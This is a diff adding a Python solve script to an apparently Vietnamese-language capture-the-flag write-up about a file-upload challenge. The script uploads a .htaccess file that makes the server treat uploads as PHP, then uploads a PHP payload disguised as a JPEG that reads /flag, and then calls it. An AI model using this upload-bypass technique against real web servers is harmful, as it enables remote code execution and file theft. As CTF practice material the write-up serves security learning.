@@ -23,3 +23,17 @@ Upload thành công,bây giờ các file có đuôi là hack sẽ được execu
 
 ![image](https://github.com/Llam-a/BUUCTF/assets/115911041/f7024129-6a42-4721-befb-b8e76cae9072)
 
+```solve.py
+import requests
+url = "http://eb860b1b-3bd1-47a3-8087-45e2cfda262c.node5.buuoj.cn:81/"
+session = requests.session()
+htaccess = {'uploaded': ('.htaccess', "SetHandler application/x-httpd-php", 'image/jpeg')}
+res_hta = session.post(url, files=htaccess)
+
+files = {'uploaded': ('123.jpg', "<script language=\"php\">echo file_get_contents(\"/flag\");</script>", 'image/jpeg')}
+res_jpg = session.post(url, files=files)
+
+res_shell = session.post(url + res_jpg.text[-69:-22], data = {'a':'echo file_get_contents(\'/flag\');'})
+
+print(res_shell.text)
+```
